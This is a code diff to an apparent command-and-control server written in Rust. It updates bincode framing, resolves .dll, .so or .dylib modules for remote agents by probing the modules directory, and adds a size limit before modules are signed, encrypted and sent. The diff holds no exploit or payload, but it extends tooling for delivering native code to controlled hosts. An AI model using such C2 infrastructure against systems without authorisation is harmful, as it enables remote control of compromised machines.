@@ -35,7 +35,7 @@ async fn read_frame<S: AsyncReadExt + Unpin>(r: &mut S, sess: &CryptoSession) ->
     let plain = sess
         .decrypt(&buf)
         .map_err(|e| anyhow::anyhow!("decrypt failed: {e:?}"))?;
-    Ok(bincode::deserialize(&plain)?)
+    Ok(bincode::serde::decode_from_slice(&plain, bincode::config::legacy()).map(|(v, _)| v)?)
 }
 
 async fn write_frame<S: AsyncWriteExt + Unpin>(
@@ -43,7 +43,7 @@ async fn write_frame<S: AsyncWriteExt + Unpin>(
     sess: &CryptoSession,
     msg: &Message,
 ) -> Result<()> {
-    let plain = bincode::serialize(msg)?;
+    let plain = bincode::serde::encode_to_vec(msg, bincode::config::legacy())?;
     let enc = sess.encrypt(&plain);
     w.write_u32_le(enc.len() as u32).await?;
     w.write_all(&enc).await?;
@@ -454,11 +454,18 @@ async fn handle_agent(
                 );
 
                 let module_dir = &state.config.modules_dir;
-                let ext = if cfg!(target_os = "windows") {
-                    "dll"
-                } else {
-                    "so"
-                };
+                // ── Platform-aware module resolution ───────────────────
+                // The C2-tunnelled module path must serve the correct file
+                // regardless of which OS the *server* was compiled on.
+                // Previously this used `cfg!(target_os = "windows")` which
+                // reflected the server's OS, not the requesting agent's.
+                // We now probe the modules directory for all known platform
+                // extensions and use whichever file is present.  This lets
+                // a Linux-hosted server serve `.dll` modules to Windows
+                // agents, `.so` to Linux agents, and `.dylib` to macOS
+                // agents — as long as the operator deposited the right
+                // file for each platform.
+                const PLATFORM_EXTS: &[&str] = &["dll", "so", "dylib"];
 
                 // ── Path traversal protection ──────────────────────────
                 // Reject module_id with characters outside the strict
@@ -482,8 +489,42 @@ async fn handle_agent(
                     continue;
                 }
 
-                let module_path =
-                    std::path::Path::new(module_dir).join(format!("{module_id}.{ext}"));
+                // Try each platform extension until we find one that exists.
+                // The first match wins; if none exist the agent receives an
+                // empty ModuleResponse.
+                let (module_path, matched_ext) = match PLATFORM_EXTS
+                    .iter()
+                    .find_map(|&ext| {
+                        let p =
+                            std::path::Path::new(module_dir).join(format!("{module_id}.{ext}"));
+                        if p.exists() {
+                            Some((p, ext))
+                        } else {
+                            None
+                        }
+                    }) {
+                    Some(found) => found,
+                    None => {
+                        tracing::warn!(
+                            connection_id = %conn_id,
+                            %module_id,
+                            "module file not found for any platform extension (dll/so/dylib)"
+                        );
+                        let _ = tx
+                            .send(Message::ModuleResponse {
+                                module_id: module_id.clone(),
+                                encrypted_blob: Vec::new(),
+                            })
+                            .await;
+                        continue;
+                    }
+                };
+                tracing::debug!(
+                    connection_id = %conn_id,
+                    %module_id,
+                    %matched_ext,
+                    "resolved module file"
+                );
 
                 // Canonicalize both the resolved path and the modules
                 // directory, then verify the file stays within the
@@ -530,6 +571,28 @@ async fn handle_agent(
                         tracing::warn!(path = %module_path.display(), "module not found: {e}");
                         e
                     })?;
+
+                    // Enforce the configured maximum module size.  The push
+                    // API endpoint already checks this before base64-decoding,
+                    // but this C2-tunnelled path previously skipped the check,
+                    // allowing an oversized module to be signed, encrypted,
+                    // and sent over the wire.
+                    let max_size = state.config.max_module_size;
+                    if module_bytes.len() > max_size {
+                        tracing::warn!(
+                            connection_id = %conn_id,
+                            %module_id,
+                            size = module_bytes.len(),
+                            max = max_size,
+                            "module exceeds max_module_size — rejecting"
+                        );
+                        anyhow::bail!(
+                            "module {} is {} bytes, exceeding the {}-byte limit",
+                            module_id,
+                            module_bytes.len(),
+                            max_size
+                        );
+                    }
 
                     // Sign the module with the server's Ed25519 key (if
                     // configured).  The signing format is identical to the
